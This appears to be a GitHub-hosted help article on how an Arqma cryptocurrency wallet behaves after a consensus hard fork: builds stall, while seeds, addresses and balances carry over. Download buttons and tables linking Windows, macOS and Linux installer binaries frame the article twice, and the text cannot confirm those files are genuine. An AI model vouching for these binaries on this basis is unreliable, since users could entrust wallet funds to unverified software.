![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma wallet after a hard fork: what changes and what does not</h1>

<p align="center">How a consensus change stalls an old build, and the update that fixes it.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

A hard fork is a change to the consensus rules at a published block height. What changes is which software can follow the chain; what does not change is your wallet, your seed, your address or your balance, because all of those exist independently of the rules that validate blocks.

## What a hard fork is in this system

Arqma has changed its consensus rules at published heights before, and each change took effect at a specific block rather than at a date or a version announcement. Nodes and wallets that know the new rules continue past that height; software that does not know them stops validating at it.

The visible symptom is not an error. It is a height that ceases to advance at exactly the block where the rules changed, which is why a stall is usually a build question before it is a connection question.

## One chain, not two

The most common assumption about a fork is that it splits the network and produces two assets. That is not what happened here: the chain is a single one, and there is no second chain carrying a copy of your balance.

The practical consequence is that the classic fork checklist  -  claim the forked coins, keep two wallets, watch two explorers  -  has nothing to act on. A single chain also means a single set of heights, so a block number read before the change still points at the same block after it. [Arqma atomic swap guide](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-atomic-swap.md) covers the one place where a fork of another kind does appear in this project, on the swap side rather than on the chain.

## Your wallet is not part of the fork

A wallet is keys and a scan. The seed determines the addresses ([Arqma Wallet seed phrase guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-seed-phrase.md)), and the scan determines what the wallet has seen. Consensus rules decide which blocks a node accepts; they do not alter the derivation of addresses from a phrase.

So an address recorded before a rule change still receives funds after it, a balance restored from old words is the same balance, and nothing needs to be claimed, migrated or converted. [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) covers the restore path if the wallet has to be rebuilt on new software.

## The build is the variable

Where a fork does affect you is inside the application. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build that follows the rules now in force; a wallet older than the newest rule set cannot validate what came after it, and the visible result is the stall described above.

Replacing the application does not touch the wallet file, the seed or the balance, because those live separately from the program. That separation is what makes the fix cheap: install over the old build and the existing wallet opens in the new one.

## A local node has a second requirement

If the wallet reads from a remote node, the node operator carries the upgrade and the wallet only needs to be current enough to interpret what the node reports. If the wallet reads from a local daemon, both halves have to be current: a new wallet talking to an old daemon stalls just as surely as the reverse.

The daemon and the wallet share port 19994, and the chain data lives in its own directory apart from the wallet file. [Arqma wallet file backup guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-file-location-and-backup.md) lists both paths; the point here is that refreshing one without the other leaves the stall in place.

## What a rule change looks like from the wallet's side

A wallet does not vote on rules and does not need to know they changed. It reports what the node tells it and scans the blocks it is given. When the software can interpret the new blocks the scan continues; when it cannot, the height stops at the last block it understood.

That is why the symptom is silent. There is no error for "these blocks follow rules I do not know", so the only evidence is a number that stops moving while the explorer's number keeps climbing.

## The announcement is not the event

A published height is the event. Announcements describe what happens at that height, but the chain changes when the block arrives, and software that already knows the new rules behaves identically before and after it.

Treating the announcement as the trigger produces two opposite mistakes: replacing a build that was never affected, or ignoring the height because the message was easy to miss. The height is the fact; the rest is commentary about it.

## Reading the evidence

The explorer is the independent record of height, and comparing it with the wallet's scanned height separates the two possible faults in one step: a wallet far behind a healthy node is a wallet problem, while a wallet matching a node that is itself stalled is a node problem.

That single comparison is worth more than any log, because it answers whether the chain is moving at all. It is also repeatable: run it again after a node restart and the answer still means the same thing. [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) carries the diagnostic further if the heights match and the balance is still wrong.

## Restore height keeps its meaning

Heights on this chain are absolute, so the block number for a given date does not change because the rules changed. A restore height recorded before a fork still points at the same block afterwards, and a scan from it still finds the same outputs.

This is the reason a wallet can sit out several rule changes and still restore correctly: the history it scans is the same history, read by software that now interprets it under newer rules.

## What to check after any rule change

Four facts settle the question completely, and none of them requires trusting a claim about what happened.

1. The explorer's height is advancing.
2. The wallet's scanned height is advancing toward it.
3. The address shown matches the address that holds the funds.
4. The balance matches what the explorer reports for that address.

When all four hold, the wallet is on the live chain regardless of what any announcement said.

## Where forks come up in this project now

The remaining fork-related surface is on the swap side, where a fork of another chain affects which swap pairs can be completed. That is a question about a counterparty's chain, not about Arqma's rules, and it is the subject of [Arqma atomic swap guide](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-atomic-swap.md).

On the Arqma side, the answer is stable: one chain, one wallet per seed, and a build that has to be current to follow it.

## FAQ

### Do I need to do anything to my wallet after a fork?

Only if the application is older than the new rules. The wallet file, seed and balance are unaffected; installing the current release is the whole action.

### Did a fork create a second coin to claim?

No. The chain is single, and there is no parallel chain holding a copy of your balance.

### Why did my wallet stop at a specific height?

That height is where the rules changed. Software that predates the change cannot validate blocks beyond it.

### Does a fork change my address?

No. Addresses are derived from the seed, and the derivation is unaffected by consensus rules.

### Do I need a new restore height?

No. Block heights are absolute, so a height recorded earlier still points at the same block.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-10134a?style=for-the-badge&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="https://img.shields.io/badge/platform-Windows-d6efff?style=flat-square&labelColor=090d16&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=f9fcff"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) | Separating a stale build, a restore height and a dead node in one pass. |
| [which Arqma Wallet build is current](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-which-build-is-current.md) | Telling the Flutter release apart from the older Electron desktop app. |
